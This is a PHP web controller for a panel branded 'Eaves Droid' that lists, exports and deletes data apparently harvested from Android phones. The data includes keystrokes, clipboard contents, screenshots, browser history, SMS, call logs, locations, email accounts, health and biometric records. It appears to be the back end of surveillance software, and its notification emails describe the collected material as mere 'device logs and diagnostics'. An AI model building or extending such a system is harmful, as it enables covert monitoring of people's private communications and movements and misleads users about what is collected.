    // ── Network Security ──
    public function network_security()
    {
        $data = array_merge($this->commonData('network_security', 'Network Security'), [
            'rows' => $this->finderModel->get_network_security($this->userId),
            'total' => $this->finderModel->get_count_NetworkSecurity($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/network_security', $data);
    }

    public function delete_network_security($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_network_security_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Telephony Network ──
    public function telephony_network()
    {
        $data = array_merge($this->commonData('telephony_network', 'Mobile Network'), [
            'rows' => $this->finderModel->get_telephony_network($this->userId),
            'total' => $this->finderModel->get_count_TelephonyNetwork($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/telephony_network', $data);
    }

    public function delete_telephony_network($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_telephony_network_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── System Locale ──
    public function system_locale()
    {
        $data = array_merge($this->commonData('system_locale', 'System Locale'), [
            'rows' => $this->finderModel->get_system_locale($this->userId),
            'total' => $this->finderModel->get_count_SystemLocale($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/system_locale', $data);
    }

    public function delete_system_locale($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_system_locale_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    // ── Misc Software Detail Extractors ──

    /** GET /advanced/software/app_permissions */
    public function app_permissions()
    {
        $data = array_merge($this->commonData('app_permissions', 'App Permissions'), [
            'rows' => $this->finderModel->get_app_permissions($this->userId),
            'total' => $this->finderModel->get_count_AppPermissions($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/app_permissions', $data);
    }

    public function delete_app_permissions($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_app_permissions_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/browser_history */
    public function browser_history()
    {
        $data = array_merge($this->commonData('browser_history', 'Browser History'), [
            'rows' => $this->finderModel->get_browser_history($this->userId),
            'total' => $this->finderModel->get_count_BrowserHistory($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/browser_history', $data);
    }

    public function delete_browser_history($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_browser_history_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/clipboard */
    public function clipboard()
    {
        $data = array_merge($this->commonData('clipboard', 'Clipboard'), [
            'rows' => $this->finderModel->get_clipboard($this->userId),
            'total' => $this->finderModel->get_count_Clipboard($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/clipboard', $data);
    }

    public function delete_clipboard($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_clipboard_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/content_providers */
    public function content_providers()
    {
        $data = array_merge($this->commonData('content_providers', 'Content Providers'), [
            'rows' => $this->finderModel->get_content_providers($this->userId),
            'total' => $this->finderModel->get_count_ContentProviders($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/content_providers', $data);
    }

    public function delete_content_providers($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_content_providers_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/crash_logs */
    public function crash_logs()
    {
        $data = array_merge($this->commonData('crash_logs', 'Crash Logs'), [
            'rows' => $this->finderModel->get_crash_logs($this->userId),
            'total' => $this->finderModel->get_count_CrashLogs($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/crash_logs', $data);
    }

    public function delete_crash_logs($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_crash_logs_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/digital_wellbeing */
    public function digital_wellbeing()
    {
        $data = array_merge($this->commonData('digital_wellbeing', 'Digital Wellbeing'), [
            'rows' => $this->finderModel->get_digital_wellbeing($this->userId),
            'total' => $this->finderModel->get_count_DigitalWellbeing($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/digital_wellbeing', $data);
    }

    public function delete_digital_wellbeing($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_digital_wellbeing_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/doze_standby */
    public function doze_standby()
    {
        $data = array_merge($this->commonData('doze_standby', 'Doze & Standby'), [
            'rows' => $this->finderModel->get_doze_standby($this->userId),
            'total' => $this->finderModel->get_count_DozeStandby($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/doze_standby', $data);
    }

    public function delete_doze_standby($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_doze_standby_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/email */
    public function email()
    {
        $data = array_merge($this->commonData('email', 'Email Accounts'), [
            'rows' => $this->finderModel->get_email_accounts($this->userId),
            'total' => $this->finderModel->get_count_EmailAccounts($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/email', $data);
    }

    public function delete_email($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_email_accounts_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/health_data */
    public function health_data()
    {
        $data = array_merge($this->commonData('health_data', 'Health Data'), [
            'rows' => $this->finderModel->get_health_data($this->userId),
            'total' => $this->finderModel->get_count_HealthData($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/health_data', $data);
    }

    public function delete_health_data($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_health_data_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/keyboard_input */
    public function keyboard_input()
    {
        $data = array_merge($this->commonData('keyboard_input', 'Keyboard Input'), [
            'rows' => $this->finderModel->get_keyboard_input($this->userId),
            'total' => $this->finderModel->get_count_KeyboardInput($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/keyboard_input', $data);
    }

    public function delete_keyboard_input($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_keyboard_input_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/keyguard */
    public function keyguard()
    {
        $data = array_merge($this->commonData('keyguard', 'Keyguard Events'), [
            'rows' => $this->finderModel->get_keyguard_events($this->userId),
            'total' => $this->finderModel->get_count_KeyguardEvents($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/keyguard', $data);
    }

    public function delete_keyguard($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_keyguard_events_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/screenshots */
    public function screenshots()
    {
        $data = array_merge($this->commonData('screenshots', 'Screenshots'), [
            'rows' => $this->finderModel->get_screenshots($this->userId),
            'total' => $this->finderModel->get_count_Screenshots($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/screenshots', $data);
    }

    public function delete_screenshots($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_screenshots_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/screen_state */
    public function screen_state()
    {
        $data = array_merge($this->commonData('screen_state', 'Screen State'), [
            'rows' => $this->finderModel->get_screen_state($this->userId),
            'total' => $this->finderModel->get_count_ScreenState($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/screen_state', $data);
    }

    public function delete_screen_state($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_screen_state_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/vpn_config */
    public function vpn_config()
    {
        $data = array_merge($this->commonData('vpn_config', 'VPN Configuration'), [
            'rows' => $this->finderModel->get_vpn_config($this->userId),
            'total' => $this->finderModel->get_count_VpnConfig($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/vpn_config', $data);
    }

    public function delete_vpn_config($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_vpn_config_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /** GET /advanced/software/running_processes */
    public function running_processes()
    {
        $data = array_merge($this->commonData('running_processes', 'Running Processes'), [
            'rows' => $this->finderModel->get_running_processes_detailed($this->userId),
            'total' => $this->finderModel->get_count_RunningProcessesDetailed($this->userId),
            'pager' => $this->finderModel->getPager(),
        ]);
        return $this->renderAppView('users/advanced/running_processes', $data);
    }

    public function delete_running_processes($id)
    {
        if (!$this->request->isAJAX() && $this->request->getMethod() !== 'post') {
            return $this->response->setJSON(['success' => false, 'message' => 'Invalid request method.']);
        }
        if ($this->finderModel->delete_running_processes_detailed_row((int) $id, $this->userId)) {
            return $this->response->setJSON(['success' => true, 'message' => 'Row deleted successfully.']);
        }
        return $this->response->setJSON(['success' => false, 'message' => 'Failed to delete row.']);
    }

    /**
     * Unified delete — removes ALL user data across every extractor category.
     * Includes DB records AND uploaded files on disk. Sends an email notification.
     */
    public function delete_all_user_data()
    {
        if (!$this->requireAuth()) {
            return;
        }

        $userId = $this->userId;
        $model = new \App\Models\Mod_Finder();
        $result = $model->deleteAllUserData($userId);

        if ($result['success']) {
            $this->session->setFlashdata('success', 'All user data has been permanently deleted. A confirmation email has been sent.');

            if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
                $this->sendDeleteNotificationEmail($userId, $result['deleted'], $result['total_deleted']);
            }
        } else {
            $this->session->setFlashdata('error', 'Failed to delete some data. Check logs for details.');
        }

        redirect()->back();
    }

    /**
     * Unified export — returns a structured report of all user data organized by extractor category.
     * Sends an email notification with estimated sizes.
     */
    public function export_all_user_data()
    {
        if (!$this->requireAuth()) {
            return;
        }

        $userId = $this->userId;
        $model = new \App\Models\Mod_Finder();
        $data = $model->exportAllUserData($userId);

        if (!empty($this->userData['email']) && ($this->userData['email_notifications'] ?? true)) {
            $this->sendExportNotificationEmail($userId, $data);
        }

        header('Content-Type: application/json');
        header('Content-Disposition: ' . 'attachment; filename="data_export_' . $userId . '_' . date('Ymd_His') . '.json"');
        echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit;
    }

    /**
     * Sends an HTML email notification confirming data deletion.
     */
    private function sendDeleteNotificationEmail(int $userId, array $deleted, int $totalDeleted): void
    {
        try {
            helper('email');
            
            $username = $this->userData['username'] ?? 'User';
            $asAtTimestamp = date('Y-m-d H:i:s');

            $categoryLabels = [
                'sms' => 'SMS Messages',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'apps' => 'Installed Apps',
                'location' => 'Location History',
                'activity' => 'Activity Log',
                'files' => 'Device Files',
                'sim_configs' => 'SIM Configurations',
                'device_context' => 'Device Context',
                'network_info' => 'Network Info',
                'nearby_wifi' => 'Nearby Wi-Fi',
                'accounts' => 'Accounts',
                'calendar' => 'Calendar Events',
                'bluetooth' => 'Bluetooth',
                'bluetooth_paired' => 'Paired Bluetooth Devices',
                'sensors' => 'Sensor Profile',
                'device_profile' => 'Device Profile',
                'proc_info' => 'Process Info',
                'running_processes' => 'Running Processes',
                'running_process_details' => 'Process Details',
                'running_services' => 'Running Services',
                'camera_info' => 'Camera Info',
                'battery_stats' => 'Battery Stats',
                'accessibility' => 'Accessibility Services',
                'input_methods' => 'Input Methods',
                'input_method_subtypes' => 'Input Subtypes',
                'cell_towers' => 'Cell Tower Data',
                'display_info' => 'Display Info',
                'storage' => 'Storage',
                'thermal' => 'Thermal Data',
                'nfc' => 'NFC Data',
                'hardware_graphics' => 'Graphics Hardware',
                'hardware_network' => 'Network Hardware',
                'app_security' => 'App Security',
                'network_security' => 'Network Security',
                'telephony_network' => 'Telephony Network',
                'system_locale' => 'System Locale',
                'apps_notifications' => 'App Notifications',
                'misc_software' => 'Misc Software Data',
                'misc_hardware' => 'Misc Hardware Data',
                'tbl_uploaded_files' => 'Uploaded Files',
                'captured_media' => 'Captured Media',
                'user_actions' => 'User Actions',
                'device_config' => 'Device Config',
                'app_defaults' => 'App Defaults',
            ];

            $tableLabels = [
                'tbl_extracted_sms' => 'SMS Messages',
                'tbl_extracted_call_logs' => 'Call Logs',
                'tbl_extracted_contacts' => 'Contacts',
                'tbl_extracted_installed_apps' => 'Installed Apps',
                'tbl_extracted_locations' => 'Location History',
                'tbl_extracted_activities' => 'Activity Log',
                'tbl_extracted_device_files' => 'Device Files',
                'tbl_sim_configs' => 'SIM Configs',
                'tbl_device_hardware_contexts' => 'Device Context',
                'tbl_system_network_info' => 'Network Info',
                'tbl_telemetry_wifi_networks_nearby' => 'Nearby Wi-Fi',
                'tbl_accounts' => 'Accounts',
                'tbl_extracted_calendar_events' => 'Calendar Events',
                'tbl_telemetry_bluetooth_devices' => 'Bluetooth',
                'tbl_telemetry_bluetooth_devices_paired' => 'Paired Bluetooth',
                'tbl_telemetry_sensors' => 'Sensor Profile',
                'tbl_device_profiles' => 'Device Profile',
                'tbl_system_running_processes' => 'Process Info',
                'tbl_running_processes' => 'Running Processes',
                'tbl_system_running_process_details' => 'Process Details',
                'tbl_system_running_services' => 'Running Services',
                'tbl_telemetry_cameras' => 'Camera Info',
                'tbl_telemetry_battery_stats' => 'Battery Stats',
                'tbl_system_accessibility_services' => 'Accessibility Services',
                'tbl_system_input_methods' => 'Input Methods',
                'tbl_system_input_method_subtypes' => 'Input Subtypes',
                'tbl_telemetry_cell_towers' => 'Cell Tower Data',
                'tbl_telemetry_display_info' => 'Display Info',
                'tbl_telemetry_storage_stats' => 'Storage',
                'tbl_telemetry_thermal' => 'Thermal Data',
                'tbl_telemetry_nfc' => 'NFC Data',
                'tbl_hardware_graphics' => 'Graphics Hardware',
                'tbl_hardware_network' => 'Network Hardware',
                'tbl_system_app_security' => 'App Security',
                'tbl_network_security' => 'Network Security',
                'tbl_telephony_network' => 'Telephony Network',
                'tbl_system_locale' => 'System Locale',
                'tbl_system_app_usage' => 'App Usage',
                'tbl_system_app_usage_sessions' => 'App Usage Sessions',
                'tbl_extracted_notifications' => 'Notifications',
                'tbl_data_usage' => 'Data Usage',
                'tbl_telemetry_wifi_networks' => 'Saved Wi-Fi',
                'tbl_system_default_apps_device' => 'Default Apps',
                'tbl_system_alarms' => 'Alarms',
                'tbl_extracted_media_files' => 'Captured Media',
                'tbl_user_actions' => 'User Actions',
                'tbl_device_configs' => 'Device Config',
                'tbl_system_default_apps' => 'App Defaults',
                'tbl_system_app_permissions' => 'App Permissions',
                'tbl_extracted_browser_history' => 'Browser History',
                'tbl_extracted_clipboard_entries' => 'Clipboard Data',
                'tbl_content_providers' => 'Content Providers',
                'tbl_system_crash_logs' => 'Crash Logs',
                'tbl_system_digital_wellbeing' => 'Digital Wellbeing',
                'tbl_system_digital_wellbeing_apps' => 'Wellbeing App Timers',
                'tbl_system_doze_standby' => 'Doze & Standby',
                'tbl_system_doze_standby_apps' => 'Standby Buckets',
                'tbl_extracted_email_accounts' => 'Email Accounts',
                'tbl_health_data' => 'Health Data',
                'tbl_keyboard_input' => 'Keyboard Input',
                'tbl_system_keyguard_events' => 'Keyguard Events',
                'tbl_extracted_screenshots' => 'Screenshots',
                'tbl_screen_state' => 'Screen State',
                'tbl_vpn_config' => 'VPN Configuration',
                'tbl_system_running_processes_detailed' => 'Running Processes',
                'tbl_telemetry_audio_devices' => 'Audio Devices',
                'tbl_audio_volumes' => 'Audio Volume Profiles',
                'tbl_biometric' => 'Biometric',
                'tbl_telemetry_gnss_hardware' => 'GNSS Hardware',
                'tbl_telemetry_power_rails' => 'Power Rails',
                'tbl_telemetry_usb_devices' => 'USB Devices',
                'tbl_telemetry_vibration' => 'Vibration',
            ];

            // Build detailed category data from deleted array
            $categoriesWithTables = [];
            foreach (\App\Models\Mod_Finder::TABLE_REGISTRY as $catKey => $tables) {
                $tableList = is_array($tables) ? $tables : [$tables];
                $tablesList = [];
                foreach ($tableList as $table) {
                    if (!isset($deleted[$table])) continue;
                    $tablesList[] = [
                        'name'  => $table,
                        'count' => $deleted[$table],
                        'label' => $tableLabels[$table] ?? $table,
                    ];
                }
                if (!empty($tablesList)) {
                    $categoriesWithTables[$catKey] = [
                        'tables'       => $tablesList,
                        'total_rows'   => array_sum(array_column($tablesList, 'count')),
                    ];
                }
            }

            $emailData = [
                'username'             => $username,
                'asAtTimestamp'        => $asAtTimestamp,
                'categories'           => $categoriesWithTables,
                'categoryLabels'       => $categoryLabels,
                'totalDeleted'         => $totalDeleted,
                // Security Audit Metadata
                'securityAction'       => 'Data Deletion',
                'securityDescription'  => 'Permanently deleted device logs and diagnostics',
                'securityStatus'       => 'completed',
            ];

            send_templated_email($this->userData['email'], 'Eaves Droid — Data Deletion Confirmation', 'email/data_delete_notification', $emailData);
            log_message('info', 'Delete notification email sent to user ' . $userId);
        } catch (\Exception $e) {
            log_message('error', 'Failed to send delete notification email to user ' . $userId . ' — ' . $e->getMessage());
        }
    }

    /**
     * Sends an HTML email notification confirming data export with estimated sizes.
     */
    private function sendExportNotificationEmail(int $userId, array $data): void
    {
        try {
            helper('email');
            $username = $this->userData['username'] ?? 'User';

            $categoryLabels = [
                'sms' => 'SMS Messages',
                'calls' => 'Call Logs',
                'contacts' => 'Contacts',
                'apps' => 'Installed Apps',
                'location' => 'Location History',
                'activity' => 'Activity Log',
                'files' => 'Device Files',
                'sim_configs' => 'SIM Configurations',
                'device_context' => 'Device Context',
                'network_info' => 'Network Info',
                'nearby_wifi' => 'Nearby Wi-Fi',
                'accounts' => 'Accounts',
                'calendar' => 'Calendar Events',
                'bluetooth' => 'Bluetooth',
                'bluetooth_paired' => 'Paired Bluetooth Devices',
                'sensors' => 'Sensor Profile',
                'device_profile' => 'Device Profile',
                'proc_info' => 'Process Info',
                'running_processes' => 'Running Processes',
                'running_process_details' => 'Process Details',
                'running_services' => 'Running Services',
                'camera_info' => 'Camera Info',
                'battery_stats' => 'Battery Stats',
                'accessibility' => 'Accessibility Services',
                'input_methods' => 'Input Methods',
                'input_method_subtypes' => 'Input Subtypes',
                'cell_towers' => 'Cell Tower Data',
                'display_info' => 'Display Info',
                'storage' => 'Storage',
                'thermal' => 'Thermal Data',
                'nfc' => 'NFC Data',
                'hardware_graphics' => 'Graphics Hardware',
                'hardware_network' => 'Network Hardware',
                'app_security' => 'App Security',
                'network_security' => 'Network Security',
                'telephony_network' => 'Telephony Network',
                'system_locale' => 'System Locale',
                'apps_notifications' => 'App Notifications',
                'misc_software' => 'Misc Software Data',
                'misc_hardware' => 'Misc Hardware Data',
                'tbl_uploaded_files' => 'Uploaded Files',
                'captured_media' => 'Captured Media',
                'user_actions' => 'User Actions',
                'device_config' => 'Device Config',
                'app_defaults' => 'App Defaults',
            ];

            $tableLabels = [
                'tbl_extracted_sms' => 'SMS Messages',
                'tbl_extracted_call_logs' => 'Call Logs',
                'tbl_extracted_contacts' => 'Contacts',
                'tbl_extracted_installed_apps' => 'Installed Apps',
                'tbl_extracted_locations' => 'Location History',
                'tbl_extracted_activities' => 'Activity Log',
                'tbl_extracted_device_files' => 'Device Files',
                'tbl_sim_configs' => 'SIM Configs',
                'tbl_device_hardware_contexts' => 'Device Context',
                'tbl_system_network_info' => 'Network Info',
                'tbl_telemetry_wifi_networks_nearby' => 'Nearby Wi-Fi',
                'tbl_accounts' => 'Accounts',
                'tbl_extracted_calendar_events' => 'Calendar Events',
                'tbl_telemetry_bluetooth_devices' => 'Bluetooth',
                'tbl_telemetry_bluetooth_devices_paired' => 'Paired Bluetooth',
                'tbl_telemetry_sensors' => 'Sensor Profile',
                'tbl_device_profiles' => 'Device Profile',
                'tbl_system_running_processes' => 'Process Info',
                'tbl_running_processes' => 'Running Processes',
                'tbl_system_running_process_details' => 'Process Details',
                'tbl_system_running_services' => 'Running Services',
                'tbl_telemetry_cameras' => 'Camera Info',
                'tbl_telemetry_battery_stats' => 'Battery Stats',
                'tbl_system_accessibility_services' => 'Accessibility Services',
                'tbl_system_input_methods' => 'Input Methods',
                'tbl_system_input_method_subtypes' => 'Input Subtypes',
                'tbl_telemetry_cell_towers' => 'Cell Tower Data',
                'tbl_telemetry_display_info' => 'Display Info',
                'tbl_telemetry_storage_stats' => 'Storage',
                'tbl_telemetry_thermal' => 'Thermal Data',
                'tbl_telemetry_nfc' => 'NFC Data',
                'tbl_hardware_graphics' => 'Graphics Hardware',
                'tbl_hardware_network' => 'Network Hardware',
                'tbl_system_app_security' => 'App Security',
                'tbl_network_security' => 'Network Security',
                'tbl_telephony_network' => 'Telephony Network',
                'tbl_system_locale' => 'System Locale',
                'tbl_system_app_usage' => 'App Usage',
                'tbl_system_app_usage_sessions' => 'App Usage Sessions',
                'tbl_extracted_notifications' => 'Notifications',
                'tbl_data_usage' => 'Data Usage',
                'tbl_telemetry_wifi_networks' => 'Saved Wi-Fi',
                'tbl_system_default_apps_device' => 'Default Apps',
                'tbl_system_alarms' => 'Alarms',
                'tbl_extracted_media_files' => 'Captured Media',
                'tbl_user_actions' => 'User Actions',
                'tbl_device_configs' => 'Device Config',
                'tbl_system_default_apps' => 'App Defaults',
                'tbl_system_app_permissions' => 'App Permissions',
                'tbl_extracted_browser_history' => 'Browser History',
                'tbl_extracted_clipboard_entries' => 'Clipboard Data',
                'tbl_content_providers' => 'Content Providers',
                'tbl_system_crash_logs' => 'Crash Logs',
                'tbl_system_digital_wellbeing' => 'Digital Wellbeing',
                'tbl_system_digital_wellbeing_apps' => 'Wellbeing App Timers',
                'tbl_system_doze_standby' => 'Doze & Standby',
                'tbl_system_doze_standby_apps' => 'Standby Buckets',
                'tbl_extracted_email_accounts' => 'Email Accounts',
                'tbl_health_data' => 'Health Data',
                'tbl_keyboard_input' => 'Keyboard Input',
                'tbl_system_keyguard_events' => 'Keyguard Events',
                'tbl_extracted_screenshots' => 'Screenshots',
                'tbl_screen_state' => 'Screen State',
                'tbl_vpn_config' => 'VPN Configuration',
                'tbl_system_running_processes_detailed' => 'Running Processes',
                'tbl_telemetry_audio_devices' => 'Audio Devices',
                'tbl_audio_volumes' => 'Audio Volume Profiles',
                'tbl_biometric' => 'Biometric',
                'tbl_telemetry_gnss_hardware' => 'GNSS Hardware',
                'tbl_telemetry_power_rails' => 'Power Rails',
                'tbl_telemetry_usb_devices' => 'USB Devices',
                'tbl_telemetry_vibration' => 'Vibration',
            ];

            $categoriesWithTables = [];
            foreach ($data['categories'] as $catKey => $catData) {
                $tables = [];
                foreach ($catData['tables'] as $tbl) {
                    $tables[] = [
                        'name'                 => $tbl['name'],
                        'count'                => $tbl['count'],
                        'estimated_size_human' => $tbl['estimated_size_human'],
                        'label'                => $tableLabels[$tbl['name']] ?? $tbl['name'],
                    ];
                }
                $categoriesWithTables[$catKey] = [
                    'tables'             => $tables,
                    'total_rows'         => $catData['total_rows'],
                    'total_size_human'   => $catData['total_size_human'],
                ];
            }

            $emailData = [
                'username'             => $username,
                'asAtTimestamp'        => date('Y-m-d H:i:s'),
                'categories'           => $categoriesWithTables,
                'categoryLabels'       => $categoryLabels,
                'totalRows'            => $data['total_rows'],
                'totalSizeHuman'       => $data['total_size_human'],
                // Security Audit Metadata
                'securityAction'       => 'Data Export',
                'securityDescription'  => 'Requested backup copy of device logs and diagnostics',
                'securityStatus'       => 'completed',
            ];

            send_templated_email($this->userData['email'], 'Eaves Droid — Data Export Complete', 'email/data_export_notification', $emailData);
            log_message('info', 'Export notification email sent to user ' . $userId);
        } catch (\Exception $e) {
            log_message('error', 'Failed to send export notification email to user ' . $userId . ' — ' . $e->getMessage());
        }
    }
}
